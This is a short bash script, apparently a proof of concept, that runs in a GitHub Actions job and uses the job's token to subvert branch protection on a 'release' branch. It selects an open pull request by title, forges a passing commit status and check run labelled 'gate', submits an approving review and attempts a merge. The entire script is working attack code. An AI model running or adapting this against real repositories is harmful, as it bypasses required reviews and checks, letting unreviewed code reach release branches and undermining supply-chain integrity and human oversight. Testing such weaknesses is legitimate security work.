#!/bin/bash
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"
st(){ local label="$1" m="$2" u="$3" body="${4:-}" code
  if [ -n "$body" ]; then code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" -d "$body" "$u")
  else code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" "$u"); fi
  echo "REV|$code|$label|$(head -c 250 /tmp/o | tr -d '\n')"; }
echo "REV|CTX|event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
curl -s "${H[@]}" "$API/repos/$R/pulls?state=open&base=release&per_page=20" > /tmp/prs
read -r PRN PRS <<<"$(python3 -c "
import json
for p in json.load(open('/tmp/prs')):
    if 'CONTROL' not in p['title'].upper() and 'REVIEWGATE' in p['title'].upper():
        print(p['number'], p['head']['sha']); break
")"
echo "REV|TARGET|pr=$PRN head=$PRS"
if [ -n "$PRN" ]; then
  st "forge-required-check"   POST "$API/repos/$R/statuses/$PRS" "{\"state\":\"success\",\"context\":\"gate\",\"description\":\"forged\"}"
  st "forge-check-run"        POST "$API/repos/$R/check-runs" "{\"name\":\"gate\",\"head_sha\":\"$PRS\",\"status\":\"completed\",\"conclusion\":\"success\"}"
  # the question: can this token satisfy a REQUIRED REVIEW?
  st "SUBMIT-APPROVING-REVIEW" POST "$API/repos/$R/pulls/$PRN/reviews" "{\"event\":\"APPROVE\",\"body\":\"approved by a fork-authored merge_group job\"}"
  sleep 15
  st "MERGE-ATTEMPT"          PUT  "$API/repos/$R/pulls/$PRN/merge" "{\"merge_method\":\"merge\"}"
fi
echo "REV|DONE|rev.sh completed unconditionally"
